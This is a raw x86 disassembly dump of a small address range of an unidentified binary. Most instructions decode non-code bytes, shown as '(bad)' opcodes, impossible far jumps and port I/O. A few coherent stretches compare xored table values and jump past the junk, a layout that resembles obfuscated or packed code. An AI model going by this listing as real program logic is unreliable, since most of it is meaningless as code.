  4118c8:	clc    
  4118c9:	imul   ebp,edi,0xd1edbf50
  4118cf:	jmp    0x900d9fd5
  4118d4:	pop    edx
  4118d5:	add    eax,0x9e91445c
  4118da:	sub    dh,BYTE PTR [eax]
  4118dc:	repnz adc esp,edi
  4118df:	cmp    al,0x3
  4118e1:	call   0x89b6:0xb991a80
  4118e8:	loope  0x4118d1
  4118ea:	clc    
  4118eb:	mov    ?,WORD PTR [edi+0x24257f1c]
  4118f1:	xchg   ebp,eax
  4118f2:	sbb    esi,edi
  4118f4:	clc    
  4118f5:	addr16 cli 
  4118f7:	neg    BYTE PTR [ebp+ebx*2+0x1a941cfa]
  4118fe:	test   dl,cl
  411900:	daa    
  411901:	stos   BYTE PTR es:[edi],al
  411902:	sti    
  411903:	cli    
  411904:	cli    
  411905:	dec    edi
  411906:	ficomp DWORD PTR [esi+0x21]
  411909:	or     DWORD PTR ds:[ecx+ecx*4+0x71035f1c],0x3e
  411912:	and    edx,edx
  411914:	test   BYTE PTR [ebx],bl
  411916:	pop    ebx
  411917:	hlt    
  411918:	pop    es
  411919:	cwde   
  41191a:	std    
  41191b:	cmp    al,0x4e
  41191d:	cmp    BYTE PTR [ebx+edi*1-0x2e],al
  411921:	xchg   edx,eax
  411922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411923:	aaa    
  411924:	stos   DWORD PTR es:[edi],eax
  411925:	aam    0x97
  411927:	jl     0x411908
  411929:	mov    BYTE PTR [ecx],0x38
  41192c:	loop   0x411996
  41192e:	inc    esp
  41192f:	cs inc edi
  411931:	mov    edi,0x79ad528f
  411936:	shl    DWORD PTR [ecx+ecx*1],0xc5
  41193a:	lock xor eax,0xcb452bf6
  411940:	and    eax,0x8823c45d
  411945:	fdivr  QWORD PTR [esi]
  411947:	(bad)  
  411948:	mov    ch,0x46
  41194a:	push   0xdaa9c03f
  41194f:	dec    ebx
  411950:	mov    edi,ebp
  411952:	cmp    DWORD PTR [edi],eax
  411954:	pushf  
  411955:	leave  
  411956:	pusha  
  411957:	add    esp,DWORD PTR [edx+0x1a]
  41195a:	fwait
  41195b:	lods   al,BYTE PTR ds:[esi]
  41195c:	and    DWORD PTR [edi-0x64b2cd85],esp
  411962:	push   esi
  411963:	mov    edx,DWORD PTR [ebx]
  411965:	xchg   ecx,eax
  411966:	clc    
  411967:	div    BYTE PTR [eax+0x57]
  41196a:	push   esi
  41196b:	mov    esp,edx
  41196d:	lods   eax,DWORD PTR ds:[esi]
  41196e:	daa    
  41196f:	popa   
  411970:	adc    DWORD PTR gs:[edi+0x7e652d21],0x56
  411978:	xor    eax,0xf9b57bf5
  41197d:	rcr    BYTE PTR [ecx-0x45],1
  411980:	inc    ebp
  411981:	inc    ebp
  411982:	test   DWORD PTR [ebx+0x216ef86b],0x94b3c6e7
  41198c:	jmp    0x28857376
  411991:	test   DWORD PTR [edi+ebp*2],0x3e02dbdf
  411998:	out    dx,eax
  411999:	sub    ecx,DWORD PTR [ebx]
  41199b:	sahf   
  41199c:	repnz vaddss xmm3,xmm4,DWORD PTR [eax+0x267dbd0a]
  4119a5:	xor    edi,DWORD PTR [ebp-0x48]
  4119a8:	(bad)  
  4119a9:	xor    ebx,edi
  4119ab:	cs and al,0x16
  4119ae:	ins    DWORD PTR es:[edi],dx
  4119af:	inc    edx
  4119b0:	(bad)  
  4119b1:	mov    WORD PTR [ebp+0x7e38b9af],es
  4119b7:	mov    edx,DWORD PTR [ebp-0x3c]
  4119ba:	xor    ecx,0xf3a
  4119c0:	or     ecx,eax
  4119c2:	mov    eax,ds:0x422518
  4119c7:	mov    eax,DWORD PTR [eax+0x1d8]
  4119cd:	mov    eax,DWORD PTR [eax]
  4119cf:	xor    esi,0x6665
  4119d5:	or     esi,edx
  4119d7:	add    ecx,0xef6a96a5
  4119dd:	cdq    
  4119de:	adc    esi,0xc8b6a000
  4119e4:	cmp    eax,ecx
  4119e6:	jne    0x4119f4
  4119ec:	cmp    edx,esi
  4119ee:	je     0x411f3d
  4119f4:	mov    eax,DWORD PTR [ebp-0x50]
  4119f7:	jmp    0x411c6c
  4119fc:	loope  0x4119a1
  4119fe:	lods   eax,DWORD PTR ds:[esi]
  4119ff:	aam    0xab
  411a01:	mov    edx,0xd9d49ae0
  411a06:	gs mov esp,0x6a33ad74
  411a0c:	imul   BYTE PTR [esi+0x18]
  411a0f:	sbb    BYTE PTR [ecx+0x14],dh
  411a12:	sbb    BYTE PTR [eax],bl
  411a14:	dec    esi
  411a15:	pop    DWORD PTR [esi+eiz*1+0x797a8404]
  411a1c:	mov    ecx,0xb5c45353
  411a21:	enter  0x960e,0xea
  411a25:	aad    0x6e
  411a27:	sub    esi,edx
  411a29:	daa    
  411a2a:	cdq    
  411a2b:	pop    ecx
  411a2c:	xchg   edi,eax
  411a2d:	jo     0x4119cb
  411a2f:	outs   dx,DWORD PTR ds:[esi]
  411a30:	push   0xffffffbd
  411a32:	dec    ebp
  411a33:	arpl   WORD PTR [eax-0x47],cx
  411a36:	(bad)  
  411a37:	call   0xe3c293b
  411a3c:	jno    0x411a95
  411a3e:	test   BYTE PTR [ebx+0x1b],ch
  411a41:	mov    dh,0x12
  411a43:	mov    al,ds:0x1d3d6bcc
  411a48:	inc    eax
  411a49:	xchg   ebx,eax
  411a4a:	ins    BYTE PTR es:[edi],dx
  411a4b:	adc    DWORD PTR [edi],ebx
  411a4d:	mov    dl,0x77
  411a4f:	cmc    
  411a50:	hlt    
  411a51:	addr16 inc edi
  411a53:	shl    esp,cl
  411a55:	call   DWORD PTR [esi]
  411a57:	ror    DWORD PTR [edi-0x20],cl
  411a5a:	retf   
  411a5b:	or     al,0xc2
  411a5d:	add    ebx,esp
  411a5f:	dec    esi
  411a60:	popf   
  411a61:	test   BYTE PTR [edi-0x7f66a9b9],0x22
  411a68:	xor    eax,0xaef36ffa
  411a6d:	test   BYTE PTR [edx+edx*8+0x2a],ch
  411a71:	rcr    DWORD PTR [ebx],1
  411a73:	mov    ebx,0xb79af847
  411a78:	xor    al,0x90
  411a7a:	mov    esp,0xe288c6a6
  411a7f:	xchg   esi,eax
  411a80:	loop   0x411a8b
  411a82:	add    DWORD PTR gs:[edx-0x25],ebp
  411a86:	jle    0x411ade
  411a88:	adc    ah,BYTE PTR [ebx-0x17988518]
  411a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a8f:	repz (bad) 
  411a91:	ss popf 
  411a93:	cmp    eax,0xb62eeb32
  411a98:	inc    eax
  411a99:	(bad)  
  411a9a:	(bad)  
  411a9b:	fnstenv [edi-0x6473b82]
  411aa1:	leave  
  411aa2:	sti    
  411aa3:	adc    BYTE PTR [ecx-0x7b],ah
  411aa6:	es mov ebp,0xcd7bbf27
  411aac:	idiv   ah
  411aae:	(bad)  gs:[ebp-0x19]
  411ab2:	test   BYTE PTR [edi+0x2d0db121],bh
  411ab8:	xor    BYTE PTR [edi-0xa31f676],dh
  411abe:	inc    edi
  411abf:	push   edi
  411ac0:	repz (bad) 
  411ac2:	jmp    0x411b41
  411ac4:	or     al,0xf1
  411ac6:	cmp    dh,BYTE PTR [ebx]
  411ac8:	call   0xe8b1a2cf
  411acd:	sub    al,0xd2
  411acf:	cmp    eax,0x986211e5
  411ad4:	dec    ebx
  411ad5:	push   edx
  411ad6:	mov    al,0x7
  411ad8:	add    DWORD PTR [ebp+0xb],ebx
  411adb:	push   esp
  411adc:	jnp    0x411adf
  411ade:	xchg   BYTE PTR [esi+0x40],al
  411ae1:	cmp    ebp,DWORD PTR [ecx-0x609d9da6]
  411ae7:	or     al,0xeb
  411aea:	mov    ebp,0x1121b2e5
  411aef:	icebp  
  411af0:	pop    ebp
  411af1:	stc    
  411af2:	mov    esp,0x2470d36
  411af7:	into   
  411af8:	xor    DWORD PTR [ecx],eax
  411afa:	nop
  411afb:	ins    BYTE PTR es:[edi],dx
  411afc:	xchg   ebp,eax
  411afd:	push   0xffffffce
  411aff:	into   
  411b00:	xchg   WORD PTR [eax],bx
  411b03:	das    
  411b04:	pop    ss
  411b05:	pop    ebx
  411b06:	sub    al,0xc0
  411b08:	pop    esp
  411b09:	dec    esi
  411b0a:	lds    edi,FWORD PTR [esp+edx*4+0xb6c9cad]
  411b11:	inc    ebx
  411b12:	outs   dx,BYTE PTR ds:[esi]
  411b13:	(bad)  
  411b14:	xor    ch,BYTE PTR es:[ebx-0x3b]
  411b18:	xor    esp,0x2ced7aae
  411b1e:	push   0x51f697ed
  411b23:	int3   
  411b24:	clc    
  411b25:	inc    eax
  411b26:	fmul   QWORD PTR ds:0x22efdf38
  411b2c:	xor    BYTE PTR [edi],0x92
  411b2f:	adc    DWORD PTR [esi+0x6bac31bd],ebx
  411b35:	nop
  411b36:	out    0xbe,eax
  411b38:	dec    esp
  411b39:	sbb    cl,dh
  411b3b:	retf   0x194b
  411b3e:	in     al,0x65
  411b40:	stos   BYTE PTR es:[edi],al
  411b41:	test   eax,0x8d4b2365
  411b46:	ret    
  411b47:	shl    BYTE PTR [edx+0x7d],0x22
  411b4b:	push   esi
  411b4c:	mov    ds:0xfc6651d5,eax
  411b51:	(bad)  
  411b52:	fucomi st,st(3)
  411b54:	mov    cl,0x56
  411b56:	ret    
  411b57:	out    0x35,eax
  411b59:	repz loopne 0x411ba4
  411b5c:	sbb    DWORD PTR [ecx+0x62],esp
  411b5f:	mov    al,ds:0xc06151ad
  411b64:	ins    DWORD PTR es:[edi],dx
  411b65:	test   BYTE PTR [ebp+0xbdc6b2],bl
  411b6b:	les    esp,FWORD PTR [edi+0x385e1760]
  411b71:	pop    ss
  411b72:	imul   ebx,ebp,0x47
  411b75:	mov    ebx,0xaf316518
  411b7a:	ret    0xf5b0
  411b7d:	cmp    eax,0x695ba858
  411b82:	mov    ebx,0x75b28381
  411b87:	sub    DWORD PTR [edi+0x2a96a969],ebp
  411b8d:	inc    eax
  411b8e:	sub    DWORD PTR [ecx+edi*4],0xb431ddd
  411b95:	dec    edi
  411b96:	retf   0xb1b4
  411b99:	jno    0x411bde
  411b9b:	lock adc DWORD PTR [eax+eax*2+0x23e97b0c],0x47
  411ba4:	add    al,ch
  411ba6:	push   ebp
  411ba7:	jge    0x411bfc
  411ba9:	inc    eax
  411baa:	mov    ebx,0xfd75484a
  411baf:	sub    DWORD PTR [edx+esi*4-0x33],esi
  411bb3:	push   cs
  411bb4:	xchg   esp,eax
  411bb5:	cmp    al,0xac
  411bb8:	sbb    eax,0x567d86c1
  411bbd:	jl     0x411b52
  411bbf:	sbb    esi,esi
  411bc1:	fimul  WORD PTR [edi+0x2528753a]
  411bc7:	out    dx,al
  411bc8:	push   ds
  411bc9:	cmp    ebp,DWORD PTR [eax-0x5a]
  411bcc:	inc    ebp
  411bcd:	push   ss
  411bce:	adc    DWORD PTR [ecx+0x6f],ecx
  411bd1:	(bad)  [eax]
  411bd3:	pushf  
  411bd4:	rol    dl,cl
  411bd6:	xlat   BYTE PTR ds:[ebx]
  411bd7:	xor    BYTE PTR [ebp+ebp*8+0x3b],dh
  411bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bdc:	dec    BYTE PTR [esi-0x7e]
  411bdf:	push   eax
  411be0:	jo     0x411b6b
  411be2:	out    dx,al
  411be3:	jmp    0x9e7ab220
  411be8:	js     0x411c11
  411bea:	and    eax,0x6205207
  411bef:	arpl   WORD PTR gs:[ecx-0x3e3c386c],bp
  411bf6:	fstp   QWORD PTR [ecx]
  411bf8:	push   ds
  411bf9:	sbb    BYTE PTR [ecx-0x30],0xd0
  411bfd:	xor    eax,0xb5ae12c9
  411c02:	cmp    BYTE PTR [edi],0x9f
  411c05:	mov    DWORD PTR [ebx+0x10],ebx
  411c08:	xchg   ebp,eax
  411c09:	loope  0x411bee
  411c0b:	and    DWORD PTR [ebp+0x1c],ebx
  411c0e:	pushf  
  411c0f:	push   edi
  411c10:	ds jnp 0x411c06
  411c13:	cmp    BYTE PTR [edi+0x692031db],0xed
  411c1a:	mov    WORD PTR [ecx-0x36],cs
  411c1d:	repnz fwait
  411c1f:	cs jne 0x411c30
  411c22:	popf   
  411c23:	in     al,0x2b
  411c25:	lods   eax,DWORD PTR ds:[esi]
  411c26:	jb     0x411c4d
  411c28:	adc    DWORD PTR [ebp-0x79],0xdd389551
  411c2f:	cli    
  411c30:	pop    ecx
  411c31:	xor    DWORD PTR [ecx-0xd],edi
  411c34:	pushf  
  411c35:	ret    0x87df
  411c38:	sbb    al,0x8a
  411c3a:	mov    cs,WORD PTR [edi-0x5f25584]
  411c40:	(bad)  
  411c41:	mov    ah,0x38
  411c43:	in     eax,dx
  411c44:	ja     0x411c95
  411c46:	shl    edi,0x70
  411c49:	scas   al,BYTE PTR es:[edi]
  411c4a:	mov    al,ds:0xa3f37e85
  411c4f:	sub    dh,dh
  411c51:	pop    esp
  411c52:	inc    ebp
  411c53:	mov    eax,ds:0xa27844c4
  411c58:	xchg   DWORD PTR [ebx],edx
  411c5a:	fiadd  DWORD PTR [edi]
  411c5c:	and    al,0x75
  411c5e:	mov    ds:0xc3119048,al
  411c63:	and    ebp,ebp
  411c65:	push   esi
  411c66:	push   esi
  411c67:	cdq    
  411c68:	pop    esp
  411c69:	in     al,0x47
  411c6b:	lods   al,BYTE PTR ds:[esi]
  411c6c:	mov    ecx,DWORD PTR [ebp-0x4c]
  411c6f:	mov    edx,DWORD PTR [ebp-0x60]
  411c72:	mov    esi,DWORD PTR [ebp-0x5c]
  411c75:	add    eax,0x7818
  411c7a:	adc    ecx,0x87
  411c80:	or     eax,edx
  411c82:	mov    edx,DWORD PTR [ebp-0x70]
  411c85:	jmp    0x411efa
  411c8a:	pop    ebp
  411c8b:	and    DWORD PTR [esi],esi
  411c8d:	xor    bh,BYTE PTR ds:[esi]
  411c90:	pop    ebp
  411c91:	sbb    bh,BYTE PTR [edi+edi*8+0x46086a08]
  411c98:	push   es
  411c99:	push   0x4f
  411c9b:	push   0x18
  411c9d:	sbb    BYTE PTR [ecx+0x14],dh
  411ca0:	sbb    BYTE PTR [eax],bl
  411ca2:	jmp    DWORD PTR [ebp-0x817d729]
  411ca8:	imul   esi,DWORD PTR [eax+0x21],0x5c
  411cac:	push   esp
  411cad:	sbb    eax,0xe278bc6
  411cb2:	adc    al,0xe5
  411cb4:	or     BYTE PTR [esi+0x2c4ee264],bl
  411cba:	in     eax,0x9f
  411cbc:	in     eax,0x2f
  411cbe:	push   edi
  411cbf:	pushf  
  411cc0:	pushf  
  411cc1:	add    eax,0x7c80137c
  411cc6:	test   DWORD PTR [ecx+0x1f56d8bc],ebx
  411ccc:	std    
  411ccd:	push   ss
  411cce:	gs push 0x8fecdff8
  411cd4:	mov    bh,BYTE PTR [ecx]
  411cd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cd7:	jge    0x411c62
  411cd9:	and    DWORD PTR [ecx+0xf44e9b9],0xb78a316d
  411ce3:	out    0x1b,eax
  411ce5:	jne    0x411c9c
  411ce7:	ret    
  411ce8:	dec    ebx
  411ce9:	scas   al,BYTE PTR es:[edi]
  411cea:	fucom  st(7)
  411cec:	and    DWORD PTR [ebp-0x3a],0x7c
  411cf0:	mov    edi,0x6e36fa95
  411cf5:	nop    DWORD PTR [ebp+0x9]
  411cf9:	push   0xffffff98
  411cfb:	repnz in eax,0xd4
  411cfe:	jbe    0x411d40
  411d00:	dec    edi
  411d01:	out    0x4a,eax
  411d03:	xchg   edi,eax
  411d04:	arpl   WORD PTR [edi+edx*8],di
  411d07:	mov    bh,0x5d
  411d09:	icebp  
  411d0a:	jl     0x411d53
  411d0c:	sti    
  411d0d:	mov    ds:0xcc82816e,al
  411d12:	push   ss
  411d13:	fcomp  DWORD PTR [ebp+edx*4+0x67]
  411d17:	loop   0x411d98
  411d19:	push   eax
  411d1a:	cmp    ebp,DWORD PTR ss:[ecx+0x48]
  411d1e:	dec    edi
  411d1f:	fld    DWORD PTR [esi-0x5404cdc0]
  411d25:	rol    BYTE PTR [ebp+0x3be0dc0c],0xe7
  411d2c:	pusha  
  411d2d:	int3   
  411d2e:	sbb    al,0xf8
  411d30:	and    esi,DWORD PTR [edi-0x29]
  411d33:	cdq    
  411d34:	arpl   sp,cx
  411d36:	and    BYTE PTR [eax-0xd],dl
  411d39:	xor    edx,DWORD PTR [edi-0xc]
  411d3c:	shr    DWORD PTR [edi+0x2],1
  411d3f:	sub    DWORD PTR [ebx+0x7e],ebp
  411d42:	outs   dx,BYTE PTR ds:[esi]
  411d43:	inc    edx
  411d44:	xchg   DWORD PTR [ebp+0x20],ebx
  411d47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d48:	mov    ecx,0xbc67d356
  411d4d:	mov    ebp,0x4a9b5dc5
  411d52:	jecxz  0x411db0
  411d54:	nop
  411d55:	sub    al,0x60
  411d57:	cs jb  0x411d32
  411d5a:	and    ah,0xfc
  411d5d:	inc    ebp
  411d5e:	dec    eax
  411d5f:	pop    edx
  411d60:	int    0xff
  411d62:	clc    
  411d63:	lods   eax,DWORD PTR ds:[esi]
  411d64:	repnz (bad) 
  411d66:	dec    edx
  411d67:	ret    
  411d68:	jb     0x411cfc
  411d6a:	sbb    DWORD PTR [ecx-0x6f4ca64a],eax
  411d70:	aaa    
  411d71:	in     eax,dx
  411d72:	lods   eax,DWORD PTR ds:[esi]
  411d73:	dec    ecx
  411d74:	inc    ecx
  411d75:	cmp    ebp,esi
  411d77:	scas   eax,DWORD PTR es:[edi]
  411d78:	push   0xca7f7053
  411d7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d7e:	dec    ecx
  411d7f:	loopne 0x411daa
  411d81:	in     eax,dx
  411d82:	repz add eax,0xb712e274
  411d88:	jg     0x411d11
  411d8a:	lahf   
  411d8b:	cmp    ebp,ecx
  411d8d:	mov    esp,DWORD PTR [ebx+0x5b]
  411d90:	cwde   
  411d91:	sbb    eax,0xad88899f
  411d96:	sar    DWORD PTR [ebx-0x631a8514],0xfb
  411d9d:	stos   DWORD PTR es:[edi],eax
  411d9e:	cli    
  411d9f:	mov    esp,0xc0604d3a
  411da4:	scas   eax,DWORD PTR es:[edi]
  411da5:	fnstcw WORD PTR [eax-0x2c]
  411da8:	in     al,dx
  411da9:	jns    0x411e01
  411dab:	push   esi
  411dac:	ret    
  411dad:	(bad)  
  411dae:	mov    edi,0x108bc60a
  411db3:	or     eax,0xacd1e3fd
  411db8:	idiv   BYTE PTR [esi+0x6681b7ba]
  411dbe:	mov    ds:0x85bb103d,eax
  411dc3:	in     eax,0xb
  411dc5:	repnz (bad) 
  411dc7:	jmp    0x222c:0x6ffad513
  411dce:	or     esi,esp
  411dd0:	cmp    dh,BYTE PTR [edx+0x5ba06878]
  411dd6:	addr16 daa 
  411dd8:	inc    esi
  411dd9:	in     eax,dx
  411dda:	xor    eax,0x1c3eb883
  411ddf:	fild   DWORD PTR ds:0x290f143e
  411de5:	adc    eax,0xe71297ea
  411dea:	mov    esp,0xc87f4ae
  411def:	scas   al,BYTE PTR es:[edi]
  411df0:	mov    edi,0xb5d8d196
  411df5:	(bad)  
  411df6:	mov    esp,0x2aefe6c8
  411dfb:	cmp    al,0xcc
  411dfd:	sub    eax,0xd733d485
  411e02:	pop    ebp
  411e03:	or     esp,eax
  411e05:	cmc    
  411e06:	pop    ebx
  411e07:	hlt    
  411e08:	xchg   ebp,eax
  411e09:	adc    eax,DWORD PTR [edi]
  411e0b:	inc    ecx
  411e0c:	dec    edx
  411e0d:	retf   
  411e0e:	test   al,0x89
  411e10:	mov    bh,0xf
  411e12:	or     WORD PTR [ebp+0x29f9bb74],si
  411e19:	jmp    0x411da4
  411e1b:	jecxz  0x411e24
  411e1d:	fs push edi
  411e1f:	(bad)  
  411e21:	mov    dl,0xa6
  411e23:	pushf  
  411e24:	in     al,dx
  411e25:	mov    al,0xb7
  411e27:	push   eax
  411e28:	xchg   ebp,eax
  411e29:	inc    esi
  411e2a:	ficom  DWORD PTR [edi-0xb]
  411e2d:	in     eax,dx
  411e2e:	rcl    BYTE PTR [edx-0x6],cl
  411e31:	in     eax,dx
  411e32:	scas   eax,DWORD PTR es:[edi]
  411e33:	jp     0x411e8d
  411e35:	push   edx
  411e36:	hlt    
  411e37:	ret    
  411e38:	jo     0x411dff
  411e3a:	out    0x8f,eax
  411e3c:	jle    0x411de6
  411e3e:	stos   BYTE PTR es:[edi],al
  411e3f:	mov    ds:0xd4aed289,eax
  411e44:	pop    esi
  411e45:	jne    0x411e29
  411e47:	mov    esp,edi
  411e49:	in     al,dx
  411e4a:	pop    ss
  411e4b:	popf   
  411e4c:	pop    ebp
  411e4d:	fnstcw WORD PTR [edx-0x2117ad1]
  411e53:	or     bl,BYTE PTR [eax+esi*8]
  411e56:	adc    ah,BYTE PTR ds:0x6a9ad2d9
  411e5c:	push   esp
  411e5d:	sbb    DWORD PTR [eax+edx*1],ebx
  411e60:	stc    
  411e61:	jmp    0x9b7a:0xad178843
  411e68:	mov    ebx,0x8a40318
  411e6d:	dec    edx
  411e6e:	jecxz  0x411eb5
  411e70:	fdiv   QWORD PTR [ebx+ebp*4-0x65136235]
  411e78:	dec    ebx
  411e79:	pushf  
  411e7a:	jae    0x411ea3
  411e7c:	scas   eax,DWORD PTR es:[edi]
  411e7d:	sahf   
  411e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e7f:	jg     0x411e3b
  411e81:	ret    0x53f0
  411e84:	inc    edx
  411e85:	jns    0x411e82
  411e87:	adc    ebp,edi
  411e89:	xchg   ebp,eax
  411e8a:	dec    ebx
  411e8b:	dec    ecx
  411e8c:	mov    bl,0x5e
  411e8e:	es pop ecx
  411e90:	je     0x411efe
  411e92:	jmp    0xbbc9:0xde46b9ee
  411e99:	and    eax,0x33b258c8
  411e9e:	mov    BYTE PTR [esi+0x3e],bh
  411ea1:	(bad)  
  411ea2:	lahf   
  411ea3:	jl     0x411e7e
  411ea5:	clc    
  411ea6:	cdq    
  411ea7:	int3   
  411ea8:	popa   
  411ea9:	jne    0x411ef1
  411eab:	add    eax,0x5d7a9cad
  411eb0:	(bad)  
  411eb1:	xor    ch,dh
  411eb3:	adc    edi,eax
  411eb5:	pop    esi
  411eb6:	ja     0x411e3d
  411eb8:	jae    0x411ea5
  411eba:	cmc    
  411ebb:	lea    ecx,[ebx-0x18]
  411ebe:	or     DWORD PTR [esp+edi*2],esi
  411ec1:	out    0x1a,eax
  411ec3:	fwait
  411ec4:	push   esp
  411ec5:	jge    0x411ec6
  411ec7:	sar    DWORD PTR [edi+0x39798d31],1
  411ecd:	dec    ebp
  411ece:	lds    esi,FWORD PTR ds:0x8053f4a1
  411ed4:	rcr    BYTE PTR [edx+0x65f59be6],cl
  411eda:	outs   dx,DWORD PTR ds:[esi]
  411edb:	push   0xf43b9003
  411ee0:	xor    DWORD PTR [ecx-0x41],ebp
  411ee3:	(bad)  
  411ee4:	cmp    DWORD PTR [ebx],ecx
  411ee6:	cmp    DWORD PTR [edi+0x7a],ebp
  411ee9:	iret   
  411eea:	sbb    BYTE PTR [esi],bl
  411eec:	lea    eax,[edx-0x2e822e3c]
  411ef2:	adc    BYTE PTR [eax-0x51],0xa5
  411ef6:	loop   0x411f2d
  411ef8:	dec    ebp
  411ef9:	xor    BYTE PTR [ebx],cl
  411efb:	into   
  411efc:	mov    esi,DWORD PTR [ebp-0x6c]
  411eff:	push   esi
  411f00:	push   edx
  411f01:	push   ecx
  411f02:	push   eax
  411f03:	call   0x416c20
  411f08:	mov    ecx,DWORD PTR [ebp-0x80]
  411f0b:	mov    esi,DWORD PTR [ebp-0x7c]
  411f0e:	and    eax,ecx
  411f10:	mov    ecx,DWORD PTR ds:0x422518
  411f16:	mov    ecx,DWORD PTR [ecx+0x1d0]
  411f1c:	mov    ecx,DWORD PTR [ecx]
  411f1e:	and    edx,esi
  411f20:	xor    eax,0x2b01
  411f25:	xor    edx,0x2021
  411f2b:	xor    esi,esi
  411f2d:	cmp    ecx,eax
  411f2f:	jne    0x4127da
  411f35:	cmp    esi,edx
  411f37:	jne    0x4127da
  411f3d:	mov    eax,DWORD PTR [ebp-0xa4]
  411f43:	mov    ecx,DWORD PTR [ebp-0xc]
  411f46:	add    eax,0x80ca
  411f4b:	or     eax,ecx
  411f4d:	mov    ecx,DWORD PTR ds:0x4225b4
  411f53:	or     eax,0x686
  411f58:	xor    eax,0x3eec
  411f5d:	lea    eax,[eax+ecx*1-0xc11b]
  411f64:	xor    DWORD PTR ds:0x4225ac,eax
  411f6a:	mov    eax,DWORD PTR [ebp-0x64]
  411f6d:	and    eax,0x4dff
  411f72:	add    eax,DWORD PTR [ebp-0x14]
  411f75:	mov    ecx,DWORD PTR [ebp-0x94]
  411f7b:	xor    eax,0x676c
  411f80:	xor    edx,edx
  411f82:	div    ecx
  411f84:	mov    ecx,DWORD PTR [ebp-0x24]
  411f87:	mov    edx,DWORD PTR [ebp-0x74]
  411f8a:	xor    ecx,0x6e1e
  411f90:	imul   ecx,edx
  411f93:	mov    edx,DWORD PTR [ebp+0x8]
  411f96:	push   0x4
  411f98:	jmp    0x41220d
  411f9d:	mov    gs,WORD PTR [esp+ecx*4-0x7c]
  411fa1:	push   0x64
  411fa3:	jle    0x411fff
  411fa5:	inc    ebp
  411fa6:	inc    ecx
  411fa7:	jne    0x412025
  411fa9:	mov    edi,0xa6bca79d
  411fae:	data16 sbb BYTE PTR [eax],bl
  411fb1:	jno    0x411fc7
  411fb3:	sbb    BYTE PTR [eax],bl
  411fb5:	jmp    0x53227407
  411fba:	(bad)  
  411fbb:	sub    esp,ecx
  411fbd:	push   es
  411fbe:	or     BYTE PTR [ecx+ebp*1],ch
  411fc1:	push   esi
  411fc2:	mov    bh,0x35
  411fc4:	mov    ?,WORD PTR [ecx+edi*4-0x74]
  411fc8:	ss pop ds
  411fca:	lods   al,BYTE PTR ds:[esi]
  411fcb:	fucomi st,st(2)
  411fcd:	iret   
  411fce:	in     eax,dx
  411fcf:	adc    al,0xb3
  411fd1:	push   es
  411fd2:	loope  0x411f93
  411fd4:	push   edi
  411fd5:	xchg   ecx,eax
  411fd6:	adc    BYTE PTR [edi-0x4a],ah
  411fd9:	jmp    0xf79e:0x1a609868
  411fe0:	pop    eax
  411fe1:	mov    edx,0xeabee7da
  411fe6:	js     0x411fb6
  411fe8:	mov    al,0xbb
  411fea:	jmp    0xb0ca:0xd1e9c229
  411ff1:	adc    al,0xc4
  411ff3:	popa   
  411ff4:	inc    ebp
  411ff5:	cli    
  411ff6:	xchg   ebx,eax
  411ff7:	sub    ebx,ebx
  411ff9:	sub    ebp,DWORD PTR [edi-0x44]
  411ffc:	mov    al,0xd6
  411ffe:	xchg   esp,eax
  411fff:	lods   eax,DWORD PTR ds:[esi]
  412000:	sbb    dh,BYTE PTR ds:0x9d5dc045
  412006:	adc    al,0xd6
  412008:	(bad)  
  412009:	jmp    0xdb9b48f2
  41200e:	push   edi
  41200f:	imul   edx,DWORD PTR [edi+0x4c85dbc6],0x3dd55b59
  412019:	and    ch,bh
  41201b:	mov    ecx,DWORD PTR [edx-0x3b8b7e68]
  412021:	daa    
  412022:	aas    
  412023:	pop    edi
  412024:	adc    DWORD PTR [ebp+0x72],edx
  412027:	mov    eax,edi
  412029:	jbe    0x41202a
  41202b:	outs   dx,BYTE PTR ds:[esi]
  41202c:	mov    edi,0x37f511c0
  412031:	test   BYTE PTR [ecx-0x44bbbe39],al
  412037:	addr16 mov ebp,0xe0154f9a
  41203d:	retf   0x9185
  412040:	or     bl,al
  412042:	or     al,0x8b
  412044:	js     0x411fd5
  412046:	retf   
  412047:	sbb    DWORD PTR [ebp-0x1cf32959],ebx
  41204d:	rcr    DWORD PTR [ecx-0x7e45bbf1],cl
  412053:	jge    0x411fe2
  412055:	cdq    
  412056:	aam    0xee
  412058:	mov    esi,0x824b34f8
  41205d:	daa    
  41205e:	pop    ss
  41205f:	(bad)  
  412060:	into   
  412061:	into   
  412062:	(bad)  
  412063:	pop    es
  412064:	fs pop ebp
  412066:	cmp    dh,dl
  412068:	sub    DWORD PTR [ebp-0xa],ebx
  41206b:	lds    edx,FWORD PTR [eax+0x7f76ead7]
  412071:	gs inc esi
  412073:	mov    eax,ds:0xc0675102
  412078:	lahf   
  412079:	fsub   DWORD PTR [esi]
  41207b:	dec    esp
  41207c:	call   0x68e281cd
  412081:	dec    eax
  412082:	xchg   DWORD PTR [ebp+0x22],esi
  412085:	mov    ebx,0x316155e3
  41208a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41208b:	inc    ebp
  41208c:	mov    ebp,0xb2c3c95a
  412091:	push   ecx
  412092:	push   edi
  412093:	(bad)  
  412094:	out    dx,al
  412095:	dec    ecx
  412096:	gs and al,0x5d
  412099:	lahf   
  41209a:	sbb    al,0x1a
  41209c:	xchg   ebx,eax
  41209d:	iret   
  41209e:	jmp    0x479a:0x2c28e7fe
  4120a5:	add    edi,edi
  4120a7:	shl    dl,1
  4120a9:	add    edx,DWORD PTR [edi+0x3d]
  4120ac:	jle    0x4120d8
  4120ae:	sub    eax,0x75e949fb
  4120b3:	call   0xdf3b:0x49b4ca76
  4120ba:	xchg   DWORD PTR [ebp+0x6558350f],ebx
  4120c0:	adc    ah,dh
  4120c2:	push   esp
  4120c3:	rcr    DWORD PTR [edx+ebp*8],0xee
  4120c7:	shl    DWORD PTR [edi+0x69],cl
  4120ca:	cmp    ch,BYTE PTR [eax+0x2e]
  4120cd:	jns    0x41212d
  4120cf:	and    al,BYTE PTR [ebx-0x7f5363d]
  4120d5:	fstp   QWORD PTR ss:[esi]
  4120d8:	xchg   esp,eax
  4120d9:	xchg   edx,eax
  4120da:	sub    DWORD PTR [ebp+ebx*2-0x5308d865],ecx
